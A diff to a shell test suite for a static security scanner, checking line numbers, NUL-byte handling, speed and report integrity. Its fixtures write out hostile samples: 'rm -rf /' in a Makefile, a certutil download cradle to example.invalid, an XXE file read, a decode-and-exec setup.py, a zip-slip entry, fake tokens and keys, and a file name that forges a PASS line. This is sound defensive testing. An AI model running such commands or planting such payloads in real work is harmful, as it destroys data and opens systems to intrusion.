@@ -3931,16 +3931,35 @@ print(eval(sys.argv[2]))" "$@" 2>/dev/null || echo "unreadable"; }
     printf '%s\n' 'name: app' 'spec:' '  replicas: 2' '  env:' '    password: "s3cretvalue"' > "$MD/deploy/app.yaml"
     printf '%s\n' 'resource "aws_db_instance" "db" {' '  engine = "postgres"' '  username = "admin"' '  password = "hunter2hunter2"' '}' > "$MD/infra/main.tf"
     printf '%s\r\n' 'import os' 'x = 1' 'y = eval(x)' > "$MD/src/crlf.py"                       # CRLF line endings
+    printf 'password = "ab\0cdef"\napi_key = "zzzzzzzz"\n' > "$MD/data/nul_credential.py"          # the NUL ends a line for grep -q: only line 2 matches
+    printf 'all:\n\trm -rf /\0\nclean:\n' > "$MD/data/Makefile"                                      # the NUL makes the rule match
     printf 'start\0\0\n%s\n%s\n' 'x' 'GET /..%2fetc' > "$MD/data/binary.txt"                    # a NUL byte on line 1: the file is binary to grep
     printf '%s\r\n' '@echo off' 'REM fetch' 'certutil -urlcache -f http://example.invalid/a.exe a.exe' > "$MD/tools/fetch.bat"   # searched as a view
     printf '%s\n' '<?xml version="1.0"?>' '<!DOCTYPE d [' '  <!ENTITY xxe' '    SYSTEM "file:///etc/hostname">' ']>' '<d>&xxe;</d>' > "$MD/ps/cmd.cdxml"   # the match starts on line 3 and spans two
     M_BODY='MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKj'
+    printf 'start\0\n%s\n%s\n%s\n%s\n%s\n' 'x' '-----BEGIN RSA '"PRIVATE KEY-----" "$M_BODY" "$M_BODY" "$M_BODY" > "$MD/data/nul_key.txt"   # a key after a NUL: read as text
     printf '%s\n' "-----BEGIN RSA ""PRIVATE KEY-----" "$M_BODY" "$M_BODY" "$M_BODY" "-----END RSA ""PRIVATE KEY-----" > "$MD/keys/server.key"
     printf '%s\n' 'a note about ..%2f' > "$MD/notes/a_first.txt"
     python3 -c "
 import zipfile
 z = zipfile.ZipFile('$MD/notes/z_last.zip', 'w'); z.writestr('n.txt', 'hello'); z.close()"       # a finding from a source that has no line
     printf '%s\n' 'readme' > "$MD/README.md"
+    # review findings, each seen failing before it was fixed
+    M_T1="ghp_$(printf '%s' 'Ab3dE6gH9jK2mN5pQ8sT1vW4yZ7bC0eF3hJ6')"; M_T2="ghp_$(printf '%s' 'Zb3dE6gH9jK2mN5pQ8sT1vW4yZ7bC0eF3hJ6')"
+    M_T3="ghp_$(printf '%s' 'Yb3dE6gH9jK2mN5pQ8sT1vW4yZ7bC0eF3hJ6')"
+    mkdir -p "$MD/tokens" "$MD/jars" "$MD/pkg2" "$MD/bigkeys"
+    printf '%s\n' 'x' "foo ${M_T1} bar ${M_T2}" 'third' > "$MD/tokens/two.txt"                 # two tokens on one line: the line once
+    { for _i in 1 2 3 4; do printf '%s\n' "a ${M_T1} b ${M_T2} c ${M_T3}"; done; printf '%s\n' "${M_T1}"; for _i in 1 2 3 4 5 6 7 8; do printf '%s\n' "row ${M_T2}"; done; } > "$MD/tokens/many.txt"
+    python3 -c "
+import zipfile
+z = zipfile.ZipFile('$MD/jars/evil.jar', 'w'); z.writestr('../../evil:line7.txt', 'hello'); z.writestr('META-INF/MANIFEST.MF', 'Manifest-Version: 1.0\n'); z.close()"   # text of an archive says ':line7'
+    printf '%s\n' 'import base64' "exec(open('version.py').read())" 'payload = base64.b64decode(blob)' 'exec(payload)' > "$MD/pkg2/setup.py"   # a rule of two whole-file tests
+    python3 -c "
+body = 'MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKj'
+with open('$MD/bigkeys/many.txt', 'w') as fh:
+    fh.write('x\n' * 12000000)
+    for _ in range(250):
+        fh.write('-----BEGIN RSA ' + 'PRIVATE KEY-----\n' + (body + '\n') * 3 + '-----END RSA ' + 'PRIVATE KEY-----\n')"   # 24 MB, then 250 keys
 
     for ME in bash python; do
         m_scan "$ME" "$MD" "m_all_$ME"
@@ -3957,13 +3976,27 @@ z = zipfile.ZipFile('$MD/notes/z_last.zip', 'w'); z.writestr('n.txt', 'hello'); 
         assert_eq "5|[5]|1" "$(m_get deploy/app.yaml CWE-798:inline_credential_in_yaml)" "lines [$ME]: a YAML rule"
         assert_eq "4|[4]|1" "$(m_get infra/main.tf CWE-798:hardcoded_secret_in_terraform)" "lines [$ME]: a Terraform rule"
         assert_eq "3|[3]|1" "$(m_get src/crlf.py CWE-95:dynamic_code_execution_eval_exec)" "lines [$ME]: a file with CRLF line endings is numbered like any other"
-        assert_eq "3|[3]|1" "$(m_get data/binary.txt CWE-22:path_traversal_encoded)" "lines [$ME]: a file that holds a NUL byte (binary to grep) still gets its line"
+        assert_eq "None|[]|0" "$(m_get data/binary.txt CWE-22:path_traversal_encoded)" "lines [$ME]: a file that holds a NUL byte is binary to grep: the match is read one way and a numbering would read it another, so no line"
+        assert_eq "None|[]|0" "$(m_get data/nul_credential.py CWE-798:hardcoded_credential)" "lines [$ME]: …a quoted value broken by a NUL on line 1 does not match there, and line 1 is not listed with line 2"
+        assert_eq "None|[]|0" "$(m_get data/Makefile make:destructive_recursive_delete_of_root_or_home)" "lines [$ME]: …and a match that the NUL makes possible has no line, not a wrong one"
+        assert_eq "3|[3]|1" "$(m_get data/nul_key.txt CWE-321:hardcoded_private_key)" "lines [$ME]: …but a rule that reads the file as text (-a) still names its line in a file with a NUL"
         assert_eq "1|[1]|1" "$(m_get keys/server.key CWE-321:hardcoded_private_key)" "lines [$ME]: a private key: the line of its header"
         assert_eq "3|[3]|1" "$(m_get ps/cmd.cdxml CWE-611:xxe_external_entity)" "lines [$ME]: a match over the folded file (a declaration split across two lines) starts on line 3"
         assert_eq "None|[]|0" "$(m_get tools/fetch.bat CWE-78:bat_download_cradle)" "lines [$ME]: a rule that searched a derived view (comments stripped, continuations joined) has no line, never a wrong one"
         assert_eq "None|[]|0" "$(m_get notes/z_last.zip archive:requires_dedicated_rescan)" "lines [$ME]: a finding that no matching rule produced has no line, whatever matched before it in another file"
         assert_contains "$(m_py "$MREP" "d['file_results'][sys.argv[3]]['message']" "${MD}/web/links.txt")" "[FAIL] CWE-22:path_traversal_encoded" "lines [$ME]: the message is unchanged"
-        assert_eq "False" "$(m_py "$MREP" "any(__import__('re').search(r':line[0-9]', f['message']) for f in d['findings'] if f['tool'] == 'grep-pattern')")" "lines [$ME]: …and carries no line text (the allowlist and the severity read the message)"
+        assert_eq "False" "$(m_py "$MREP" "any(__import__('re').search(r':line[0-9]', f['message']) for f in d['findings'] if f['tool'] == 'grep-pattern' and f['file'] != 'jars/evil.jar')")" "lines [$ME]: …and carries no line text (the allowlist and the severity read the message)"
+        assert_eq "2|[2]|1" "$(m_get tokens/two.txt known_credential_format_github_token)" "lines [$ME]: two tokens on one line: the line is listed once"
+        assert_eq "1|[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]|13" "$(m_get tokens/many.txt known_credential_format_github_token)" "lines [$ME]: …and the count is of lines, not of tokens (13 lines, 23 tokens)"
+        assert_eq "None|[]|0" "$(m_get jars/evil.jar CWE-22:jar_entry)" "lines [$ME]: ':line7' inside an archive entry name is repository text, not a line"
+        assert_eq "2|[2, 3, 4]|3" "$(m_get pkg2/setup.py CWE-95:setup_py_decodes_and_executes)" "lines [$ME]: a rule of two whole-file tests (decode AND execute) lists the lines of both"
+        M_PEM_EXPECT="$(python3 -c "print('%d|%s|200' % (12000001, [12000001 + 5 * k for k in range(10)]))")"
+        M_T0=$SECONDS
+        m_scan "$ME" "$MD/bigkeys" "m_big_$ME"
+        M_ELAPSED=$((SECONDS - M_T0))
+        assert_eq "$M_PEM_EXPECT" "$(m_get many.txt CWE-321:hardcoded_private_key)" "lines [$ME]: 250 private keys after 12 million lines: the first ten headers, and the 200 that were tried"
+        MREP="${MR}/report_scan_m_all_${ME}.json"       # m_scan pointed MREP at the big file's report: back to the one the rest reads
+        if (( M_ELAPSED < 60 )); then ok_test "lines [$ME]: …in ${M_ELAPSED} s, one pass over the file (the first version read it once per header: 58 s on this file)"; else fail_test "lines [$ME]: a 24 MB file with 250 keys is resolved in one pass" "took ${M_ELAPSED} s"; fi
         # the HTML report: a Lines column next to the finding, escaped like the rest of the report
         MHTML="${MR}/report_scan_m_all_${ME}.html"
         assert_contains "$(cat "$MHTML" 2>/dev/null)" "<th>Lines</th>" "lines [$ME]: the HTML report has a Lines column"
@@ -3994,6 +4027,12 @@ print('|'.join(sorted('%s=%s' % (r[2], r[col] or '') for r in rows if r[2] in ('
         assert_contains "$RUN_OUT" "app/settings.py:4" "lines: the launcher's summary names file:line"
         assert_contains "$RUN_OUT" "web/links.txt:2  (3 lines match: 2, 5, 9)" "lines: …and every matching line of a finding that has several"
         assert_not_contains "$RUN_OUT" "tools/fetch.bat:" "lines: …and leaves out a finding with no line"
+        # a file name is repository text: it must not forge a line of the summary
+        FG="${SCRATCH}/m_forge"; rm -rf "$FG"; mkdir -p "$FG"
+        printf '%s\n' 'import os' 'y = eval(x)' > "$FG/$(printf 'evil\n  Verdict : PASS\n    - forged.py')"
+        run_pipeline "$FG" --quiet --no-zip --no-excel
+        assert_eq "0" "$(printf '%s\n' "$RUN_OUT" | grep -c '^  Verdict : PASS' || true)" "lines: a file name with line breaks forges no line of the launcher's summary"
+        assert_contains "$RUN_OUT" "  Verdict : FAIL" "lines: …the real verdict is still printed"
     else
         skip_test "launcher summary names file:line" "jq not installed"
     fi
